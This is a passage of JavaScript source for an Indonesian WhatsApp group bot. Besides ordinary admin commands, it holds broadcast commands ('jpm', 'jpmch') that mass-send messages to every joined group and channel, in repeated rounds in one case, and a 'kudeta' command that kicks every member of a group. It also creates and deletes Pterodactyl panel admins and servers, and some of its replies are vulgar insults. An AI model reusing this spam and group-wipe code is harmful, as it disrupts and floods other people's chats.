if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Sky.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await Sky.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Sky.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Sky.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Sky.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
await Sky.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "openn": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Sky.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Sky.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Proses kontl")
for (let i of memberFilter) {
await Sky.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Mapus lu kontl")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Sky.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Sky.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selesai Brow🦅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`proses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai brow🦅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await Sky.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`proses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai Brow🦅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmht": {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return m.reply(example("teksnya"))
    
    let allgrup = await Sky.groupFetchAllParticipating()
    let res = await Object.keys(allgrup)
    let count = 0
    const jid = m.chat
    const teks = text
    
    await m.reply(`Memproses *jpm hidetag* ke ${res.length} grup`)

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
        try {
            let metadata = await Sky.groupMetadata(i)
            let participants = metadata.participants.map(u => u.id)

            await Sky.sendMessage(i, { 
                text: teks, 
                mentions: participants 
            }) // Hidetag, tidak menampilkan username

            count += 1
        } catch {}
        await sleep(global.delayJpm)
    }

    await Sky.sendMessage(jid, { 
        text: `*Jpm Hidetag Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` 
    }, { quoted: m })
}
break

//================================================================================

case "jpmfoto": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/video/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`proses *jpm* teks & foto Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {video: fs.readFileSync(rest), caption: teks}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai brow🦅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//================================================================================

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await Sky.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await Sky.downloadAndSaveMediaMessage(qmsg)
await m.reply(`proses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Sky.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await Sky.sendMessage(jid, {text: `*Jpm Telah Selsai Brow 🦅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//===============================================================================
 case "jpmch": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text && !m.quoted) return m.reply(example("tesk nya sama sayang bebeb🤮"));
    var teks = m.quoted ? m.quoted.text : text;
    let total = 0;

    global.channels = loadChannels();

    if (global.channels.length === 0) 
        return m.reply(`
╔══════════════════════════╗
        ❌ *SALAHAN* ❌
╚══════════════════════════╝
⚠️ Tidak ada saluran terdaftar untuk *JPM*!
Silakan daftarkan saluran terlebih dahulu.
`);

    m.reply(`
╭─❰ *PROCESSING MESSAGE* ❱─╮
📨 *Mengirim Pesan Ke*: 
  ➥ *44 Saluran*
🤚 *Mohon Tunggu...*
╰─────────────────────╯
    `);

    // Kirim pesan ke semua saluran tanpa penundaan
    await Promise.all(global.channels.map(async (id) => {
        try {
            await Sky.sendMessage(id, { text: teks }, { quoted: m });
            total += 1;
        } catch (e) {
            console.log(`⚠️ Gagal mengirim ke ${id}:`, e);
        }
    }));

    m.reply(`
╭─❰ *SUCCES MENGIRIM PESAN* ❱─╮
💌 *Pesan Terkirim*: 
  ➥ *44 Saluran*
✅ *Status*: Berhasil!
😠 𝑈𝑑𝑎ℎ 𝑘𝑒𝑘𝑖𝑟𝑖𝑚 𝑦𝑎 𝑎𝑠𝑢 𝑗𝑒𝑑𝑎 10 𝑚𝑒𝑛𝑖𝑡 𝑔𝑎𝑘 𝑗𝑒𝑑𝑎 𝑡𝑖𝑡𝑖𝑡 𝑙𝑢 𝑔𝑤 𝑝𝑜𝑡𝑜𝑛𝑔
╰─────────────────────╯
`);
}
break
        
 case "jpmalllllllch": {
     if (!isCreator) return m.reply("🚫 *Hanya Creator yang dapat menggunakan perintah ini!*");
    if (!text && !m.quoted) return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jpmch jumlah|jeda|teks`\n\n💡 *Contoh:* `jpmch 5|5|Halo semua!`");

    const [jumlahPengiriman, jedaInput, ...teksArray] = text.split("|");
    const teks = teksArray.join("|").trim(); // Gabungkan teks kembali

    if (!jumlahPengiriman || isNaN(jumlahPengiriman) || !jedaInput || isNaN(jedaInput) || !teks) {
        return m.reply("⚠️ *Format Salah!*\n\n📌 Gunakan format:\n`jpmch jumlah|jeda|teks`\n\n💡 *Contoh:* `jpmch 5|5|Halo semua!`");
    }

    const jumlah = parseInt(jumlahPengiriman); // Konversi jumlah pesan menjadi angka
    const jeda = parseInt(jedaInput) * 1000; // Konversi jeda ke milidetik
    let totalBerhasil = 0;
    let totalGagal = 0;

    global.channels = loadChannels(); // Fungsi untuk memuat daftar saluran

    if (global.channels.length === 0) return m.reply("⚠️ *Tidak ada saluran yang terdaftar untuk JPM!*");

    m.reply(
        `✨ *Memulai pengiriman pesan!* ✨\n\n` +
        `📤 *Jumlah Saluran:* ${global.channels.length}\n` +
        `📩 *Jumlah Pesan Total:* ${jumlah * global.channels.length}\n` +
        `⏳ *Jeda antar Iterasi:* ${jeda / 1000} detik.\n\n` +
        `⚙️ *Harap tunggu, proses sedang berjalan...*`
    );

    for (let i = 0; i < jumlah; i++) {
        const prosesPengiriman = global.channels.map(async (id) => {
            try {
                await Sky.sendMessage(id, { text: teks }, { quoted: m });
                totalBerhasil += 1;
            } catch (error) {
                console.error(`❌ Gagal mengirim ke ${id}:`, error);
                totalGagal += 1;
            }
        });

        // Tunggu semua pengiriman selesai di iterasi ini
        await Promise.all(prosesPengiriman);
        if (i < jumlah - 1) await sleep(jeda); // Tunggu jeda sebelum iterasi berikutnya
    }

    m.reply(
        `✅ *Pengiriman selesai!*\n\n` +
        `📊 *Hasil Pengiriman:*\n` +
        `✔️ *Berhasil:* ${totalBerhasil} pesan\n` +
        `❌ *Gagal:* ${totalGagal} pesan\n\n` +
        `💼 *Powered by CikssOffcL!*`
    );
}
break      

//===============================================================================
case "listadmin": {
    if (!isCreator) return Reply(mess.owner);
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    if (users.length < 1) return Reply("Tidak ada admin panel");
    var teks = "\n *乂 List admin panel pterodactyl*\n";
    await users.forEach((i) => {
        if (i.attributes.root_admin !== true) return;
        teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`;
    });
    await Sky.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break;

case "listpanel": case "listp": case "listserver": {
    if (!isCreator && !isPremium) return Reply(mess.owner);
    let f = await fetch(domain + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    let res = await f.json();
    let servers = res.data;
    if (servers.length < 1) return Reply("Tidak Ada Server Bot");
    let messageText = "\n *乂 List server panel pterodactyl*\n";
    for (let server of servers) {
        let s = server.attributes;
        let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
            "method": "GET",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + capikey
            }
        });
        let data = await f3.json();
        let status = data.attributes ? data.attributes.current_state : s.status;
        messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().slice(0,2) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`;
    }
    await Sky.sendMessage(m.chat, { text: messageText }, { quoted: m });
}
break;

case "deladmin": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("idnya"));
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    let getid = null;
    let idadmin = null;
    await users.forEach(async (e) => {
        if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
            getid = e.attributes.username;
            idadmin = e.attributes.id;
            let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            });
            let res = delusr.ok ? { errors: null } : await delusr.json();
        }
    });
    if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!");
    await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`);
}
break;

case "delpanel": {
    if (!isCreator && !isPremium) return Reply(mess.owner);
    if (!text) return Reply(example("idnya"));
    let f = await fetch(domain + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    let result = await f.json();
    let servers = result.data;
    let sections;
    let nameSrv;
    for (let server of servers) {
        let s = server.attributes;
        if (Number(text) == s.id) {
            sections = s.name.toLowerCase();
            nameSrv = s.name;
            let f = await fetch(domain + `/api/application/servers/${s.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            });
            let res = f.ok ? { errors: null } : await f.json();
        }
    }
    let cek = await fetch(domain + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    for (let user of users) {
        let u = user.attributes;
        if (u.first_name.toLowerCase() == sections) {
            let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey
                }
            });
            let res = delusr.ok ? { errors: null } : await delusr.json();
        }
    }
    if (sections == undefined) return Reply("Server panel tidak ditemukan!");
    Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`);
}
break;

case "listadmin-v2": {
    if (!isCreator) return Reply(mess.owner);
    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    if (users.length < 1) return Reply("Tidak ada admin panel");
    var teks = "\n *乂 List admin panel pterodactyl V2*\n";
    await users.forEach((i) => {
        if (i.attributes.root_admin !== true) return;
        teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`;
    });
    await Sky.sendMessage(m.chat, { text: teks }, { quoted: m });
}
break;

case "listpanel-v2": {
    if (!isCreator) return Reply(mess.owner);
    let f = await fetch(domainV2 + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });
    let res = await f.json();
    let servers = res.data;
    if (servers.length < 1) return Reply("Tidak Ada Server Bot");
    let messageText = "\n *乂 List server panel pterodactyl V2*\n";
    for (let server of servers) {
        let s = server.attributes;
        let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
            "method": "GET",
            "headers": {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + capikeyV2
            }
        });
        let data = await f3.json();
        let status = data.attributes ? data.attributes.current_state : s.status;
        messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`;
    }
    await Sky.sendMessage(m.chat, { text: messageText }, { quoted: m });
}
break;

case "deladmin-v2": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return Reply(example("idnya"));
    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    let getid = null;
    let idadmin = null;
    await users.forEach(async (e) => {
        if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
            getid = e.attributes.username;
            idadmin = e.attributes.id;
            let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyV2
                }
            });
            let res = delusr.ok ? { errors: null } : await delusr.json();
        }
    });
    if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!");
    await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`);
}
break;

case "delpanel-v2": {
    if (!isCreator && !isPremium) return Reply(mess.owner);
    if (!text) return Reply(example("idnya"));
    let f = await fetch(domainV2 + "/api/application/servers?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });
    let result = await f.json();
    let servers = result.data;
    let sections;
    let nameSrv;
    for (let server of servers) {
        let s = server.attributes;
        if (Number(text) == s.id) {
            sections = s.name.toLowerCase();
            nameSrv = s.name;
            let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyV2
                }
            });
            let res = f.ok ? { errors: null } : await f.json();
        }
    }
    let cek = await fetch(domainV2 + "/api/application/users?page=1", {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });
    let res2 = await cek.json();
    let users = res2.data;
    for (let user of users) {
        let u = user.attributes;
        if (u.first_name.toLowerCase() == sections) {
            let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyV2
                }
            });
            let res = delusr.ok ? { errors: null } : await delusr.json();
        }
    }
    if (sections == undefined) return Reply("Server panel tidak ditemukan!");
    Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`);
}
break;

case "cadmin":
case "createadmin": {
    if (!isCreator) return Reply(mess.owner);
    
    let args = text.split(",");
    let username = args[0]?.trim()?.toLowerCase();
    let nomorTujuan = args[1]?.trim(); // Opsional: Jika tidak ada, data dikirim ke pengirim perintah
    
    if (!username) return Reply("⚠️ Gunakan format yang benar:\n`.cadmin username` atau `.createadmin username,62XXXXXXXXX`");
    
    if (nomorTujuan && !nomorTujuan.startsWith("62")) {
        return Reply("⚠️ Nomor harus dalam format internasional (contoh: 628XXXXXXXXX)");
    }

    let email = username + "@gmail.com";
    let name = capital(username);
    let password = username + crypto.randomBytes(2).toString("hex");

    let f = await fetch(domain + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikey
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    });

    let data = await f.json();
    if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;

    let teks = `
╔════════════════════════════╗  
║  🎉 *ADMIN PANEL BERHASIL DIBUAT!* ✅  
╠════════════════════════════╣  
║ 🔹 *ID User:* ${user.id}  
║ 🔹 *Nama:* ${user.first_name}  
║ 🔹 *Username:* ${user.username}  
║ 🔹 *Password:* ${password.toString()}  
║ 🔹 *Login:* ${domain} 🌍  
╚════════════════════════════╝  

🚨 *RULES ADMIN PANEL* 🚨  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
❌ *DILARANG MENCURI SCRIPT!*  
   ➥ Jika ketahuan, akun akan dihapus & *NO REFUND!*  
📌 *Simpan baik-baik data akun ini!*  
⚡ *Gunakan panel dengan bijak!*  
   ➥ Jangan asal buat tanpa keperluan!  
🛡️ *Garansi aktif selama 10 hari!*  
📸 *Klaim garansi?*  
   ➥ Wajib menyertakan *bukti screenshot* saat pembelian!  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✨ *Terima kasih telah menggunakan layanan kami!* ✨  
📞 Jika ada kendala, hubungi support kami.  
🚀 Selamat menikmati layanan Admin Panel Anda! 🚀
`;

    let penerima = nomorTujuan ? nomorTujuan + "@s.whatsapp.net" : m.sender;

    await Sky.sendMessage(penerima, { text: teks }, { quoted: m });

    if (nomorTujuan) {
        Reply(`✅ *Admin panel berhasil dibuat!*\n📨 Data telah dikirim ke nomor tujuan: ${nomorTujuan}`);
    } else {
        Reply(`✅ *Admin panel berhasil dibuat!*\n📨 Data telah dikirim ke private chat Anda.`);
    }
}
break;

case "cadmin-v2":
case "createadmin-v2": {
    if (!isCreator) return Reply(mess.owner);
    
    let args = text.split(",");
    let username = args[0]?.trim()?.toLowerCase();
    let nomorTujuan = args[1]?.trim(); // Opsional: Jika tidak ada, data dikirim ke pengirim perintah
    
    if (!username) return Reply("⚠️ Gunakan format yang benar:\n`.cadmin-v2 username` atau `.createadmin-v2 username,62XXXXXXXXX`");
    
    if (nomorTujuan && !nomorTujuan.startsWith("62")) {
        return Reply("⚠️ Nomor harus dalam format internasional (contoh: 628XXXXXXXXX)");
    }

    let email = username + "@gmail.com";
    let name = capital(username);
    let password = username + crypto.randomBytes(2).toString("hex");

    let f = await fetch(domainV2 + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username.toLowerCase(),
            "first_name": name,
            "last_name": "Admin",
            "root_admin": true,
            "language": "en",
            "password": password.toString()
        })
    });

    let data = await f.json();
    if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));

    let user = data.attributes;

    let teks = `
╔════════════════════════════╗  
║  🎉 *ADMIN PANEL BERHASIL DIBUAT!* ✅  
╠════════════════════════════╣  
║ 🔹 *ID User:* ${user.id}  
║ 🔹 *Nama:* ${user.first_name}  
║ 🔹 *Username:* ${user.username}  
║ 🔹 *Password:* ${password.toString()} 
║ 🔹 *Login:* ${domainV2} 🌍  
╚════════════════════════════╝  

🚨 *RULES ADMIN PANEL* 🚨  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
❌ *DILARANG MENCURI SCRIPT!*  
   ➥ Jika ketahuan, akun akan dihapus & *NO REFUND!*  
📌 *Simpan baik-baik data akun ini!*  
⚡ *Gunakan panel dengan bijak!*  
   ➥ Jangan asal buat tanpa keperluan!  
🛡️ *Garansi aktif selama 10 hari!*  
📸 *Klaim garansi?*  
   ➥ Wajib menyertakan *bukti screenshot* saat pembelian!  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  

✨ *Terima kasih telah menggunakan layanan kami!* ✨  
📞 Jika ada kendala, hubungi support kami.  
🚀 Selamat menikmati layanan Admin Panel Anda! 🚀
`;

    let penerima = nomorTujuan ? nomorTujuan + "@s.whatsapp.net" : m.sender;

    await Sky.sendMessage(penerima, { text: teks }, { quoted: m });

    if (nomorTujuan) {
        Reply(`✅ *Admin panel berhasil dibuat!*\n📨 Data telah dikirim ke nomor tujuan: ${nomorTujuan}`);
    } else {
        Reply(`✅ *Admin panel berhasil dibuat!*\n📨 Data telah dikirim ke private chat Anda.`);
    }
}
break;

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "l4gb-v2": 
case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": 
case "9gb-v2": case "10gb-v2": case "unli-v2": case "unli-v2": {
    
    if (!isCreator) return Reply(mess.owner);
    if (!text.includes(",")) return Reply("Format salah! Gunakan: .1gb-v2 username,628XXXXXXXXX");

    let args = text.split(",");
    let username = args[0].trim().toLowerCase();
    let nomorTujuan = args[1].trim();

    if (!nomorTujuan.startsWith("62")) return Reply("Nomor harus dalam format internasional (contoh: 628XXXXXXXXX)");

    global.panel = username;
    let ram, disknya, cpu;

    switch (command) {
        case "1gb-v2": ram = "1000"; disknya = "1000"; cpu = "40"; break;
        case "2gb-v2": ram = "2000"; disknya = "1000"; cpu = "60"; break;
        case "3gb-v2": ram = "3000"; disknya = "2000"; cpu = "80"; break;
        case "4gb-v2": ram = "4000"; disknya = "2000"; cpu = "100"; break;
        case "5gb-v2": ram = "5000"; disknya = "3000"; cpu = "120"; break;
        case "6gb-v2": ram = "6000"; disknya = "3000"; cpu = "140"; break;
        case "7gb-v2": ram = "7000"; disknya = "4000"; cpu = "160"; break;
        case "8gb-v2": ram = "8000"; disknya = "4000"; cpu = "180"; break;
        case "9gb-v2": ram = "9000"; disknya = "5000"; cpu = "200"; break;
        case "10gb-v2": ram = "10000"; disknya = "5000"; cpu = "220"; break;
        default: ram = "0"; disknya = "0"; cpu = "0"; break;
    }

    let email = username + "@gmail.com";
    let name = username.charAt(0).toUpperCase() + username.slice(1) + " Server";
    let password = username + Math.random().toString(36).slice(-4);

    let userRes = await fetch(domainV2 + "/api/application/users", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        },
        "body": JSON.stringify({
            "email": email,
            "username": username,
            "first_name": name,
            "last_name": "Server",
            "language": "en",
            "password": password
        })
    });

    let userData = await userRes.json();
    if (userData.errors) return Reply(JSON.stringify(userData.errors[0], null, 2));

    let user = userData.attributes;
    let usr_id = user.id;

    let nestRes = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        }
    });

    let nestData = await nestRes.json();
    let startup_cmd = nestData.attributes.startup;

    let serverRes = await fetch(domainV2 + "/api/application/servers", {
        "method": "POST",
        "headers": {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": "Bearer " + apikeyV2
        },
        "body": JSON.stringify({
            "name": name,
            "description": "Server untuk " + username,
            "user": usr_id,
            "egg": parseInt(eggV2),
            "docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
            "startup": startup_cmd,
            "environment": {
                "INST": "npm",
                "USER_UPLOAD": "0",
                "AUTO_UPDATE": "0",
                "CMD_RUN": "npm start"
            },
            "limits": {
                "memory": ram,
                "swap": 0,
                "disk": disknya,
                "io": 500,
                "cpu": cpu
            },
            "feature_limits": {
                "databases": 5,
